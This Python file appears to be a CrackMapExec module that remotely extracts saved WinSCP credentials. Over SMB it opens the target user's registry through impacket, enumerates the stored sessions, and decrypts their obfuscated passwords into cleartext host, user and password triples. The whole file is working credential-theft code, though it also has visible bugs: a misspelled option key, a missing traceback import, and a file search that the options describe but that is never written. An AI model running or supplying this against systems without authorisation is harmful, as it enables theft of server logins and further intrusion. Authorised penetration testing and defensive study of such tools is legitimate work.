#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# If you are looking for a local Version, the baseline code is from https://github.com/NeffIsBack/WinSCPPasswdExtractor

from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from urllib.parse import unquote

class CMEModule:
    '''
        Module by @NeffIsBack
    '''
    name = 'winscp_dump'
    description = 'Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.'
    supported_protocols = ['smb']
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        SEARCH_PATH     Specify the search Path if you already found a WinSCP.ini file or you want to change the default Paths (you must add single quotes around the paths if they include spaces)
                        Default: 'C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini',
                        'C:\\Users\\{u}\\Documents\\WinSCP.ini'
        """
        if 'SEACH_PATH' in module_options:
            self.filepath = module_options['SEACH_PATH']
        else:
            self.filepath = ""

        self.PW_MAGIC = 0xA3
        self.PW_FLAG  = 0xFF


    # ==================== Helper ====================
    def printCreds(self, context, session):
        if type(session) is str:
            context.log.error(session)
        else:
            context.log.highlight("======={s}=======".format(s=session[0]))
            context.log.highlight("HostName: {s}".format(s=session[1]))
            context.log.highlight("UserName: {s}".format(s=session[2]))
            context.log.highlight("Password: {s}".format(s=session[3]))


    # ==================== Decrypt Password ====================
    def decryptPasswd(self, context, host: str, username: str, password: str) -> str:
        key = username + host

        # transform password to bytes
        passBytes = []
        for i in range(len(password)):
            val = int(password[i], 16)
            passBytes.append(val)

        pwFlag, passBytes = self.dec_next_char(passBytes)
        pwLength = 0

        # extract password length and trim the passbytes
        if pwFlag == self.PW_FLAG:
            _, passBytes = self.dec_next_char(passBytes)
            pwLength, passBytes = self.dec_next_char(passBytes)
        else:
            pwLength = pwFlag
        to_be_deleted, passBytes = self.dec_next_char(passBytes)
        passBytes = passBytes[to_be_deleted * 2:]

        # decrypt the password
        clearpass = ""
        for i in range(pwLength):
            val, passBytes = self.dec_next_char(passBytes)
            clearpass += chr(val)
        if pwFlag == self.PW_FLAG:
            clearpass = clearpass[len(key):]
        return clearpass


    def dec_next_char(self, passBytes) -> tuple[int, bytes]:
        """
        Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.
        Parameters
        ----------
        passBytes : bytes
            The password bytes
        """
        if not passBytes:
            return 0, passBytes
        a = passBytes[0]
        b = passBytes[1]
        passBytes = passBytes[2:]
        return ~(((a << 4) + b) ^ self.PW_MAGIC) & 0xff, passBytes


    # ==================== Handle Registry ====================
    def registrySessionExtractor(self, context, connection, sessionName):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            try:
                
                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'Software\\Martin Prikryl\\WinSCP 2\\Sessions\\' + sessionName)
                keyHandle = ans['phkResult']
            except:
                traceback.print_exc()
            
            hostName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'HostName')[1].split('\x00')[:-1][0]
            userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UserName')[1].split('\x00')[:-1][0]
            try: 
                password = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'Password')[1].split('\x00')[:-1][0]
            except:
                context.log.debug("Session found but no Password is stored!")
                password = ""

            if password:
                decPassword = self.decryptPasswd(context, hostName, userName, password)
            else:
                decPassword = "NO_PASSWORD_FOUND"
            sectionName = unquote(hostName)
            return [sessionName, hostName, userName, decPassword]
        except:
            traceback.print_exc()
        finally:
            remoteOps.finish()
            
        return "ERROR IN SESSION EXTRACTION"

    def registryDiscover(self, context, connection):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Retrieve how many sessions are stored in registry
            try:
                ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
                regHandle = ans['phKey']

                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'Software\\Martin Prikryl\\WinSCP 2\\Sessions')
                keyHandle = ans['phkResult']

                data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)

                sessions = data['lpcSubKeys']
                context.log.success("Found {} sessions in registry!".format(sessions - 1))
                
                # Get Session Names
                sessionNames = []
                for i in range(sessions):
                    sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)['lpNameOut'].split('\x00')[:-1][0])
                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                sessionNames.remove('Default%20Settings')

                # Extract stored Session infos
                for sessionName in sessionNames:
                    self.printCreds(context, self.registrySessionExtractor(context, connection, sessionName))
            except:
                context.log.error("No WinSCP config found in registry")
                traceback.print_exc()

        finally:
            remoteOps.finish()

    # ==================== Handle Configs ====================

    def on_login(self, context, connection):
        #context.log.error("Hello World")
        #context.log.info("Info")
        #context.log.highlight("HIGHLIGHT")
        #context.log.success("SUCCESS")
        self.registryDiscover(context, connection)